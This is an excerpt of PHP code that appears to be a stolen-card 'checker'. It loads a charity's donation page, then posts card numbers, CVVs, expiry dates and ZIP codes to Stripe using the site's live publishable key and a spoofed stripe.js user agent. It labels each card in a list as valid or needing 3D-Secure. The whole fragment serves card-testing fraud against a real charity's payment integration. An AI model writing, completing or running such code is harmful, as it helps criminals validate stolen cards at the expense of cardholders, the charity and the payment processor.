...
$page = file_get_contents('https://hopeinlancaster.org/donations/', false, $context);
...
curl_setopt($ch, CURLOPT_POSTFIELDS, 'card[number]='.$cc.'&card[cvc]='.$cvv.'&card[exp_month]='.$mes.'&card[exp_year]='.$ano.'&card[address_zip]='.$zip.'&payment_user_agent=stripe.js%2Faa9485558%3B+stripe-js-v3%2Faa9485558&time_on_page=52547&key=pk_live_QMBU860cL1m4otZJNXjcDFyq');
...
elseif(strpos($result2, "requires_source_action")){
    echo '<span class="badge bg-success">#CVV ✓</span> ' . $lista . ' ➜ 3D-Secure ➜ '. $MADEBY;
}
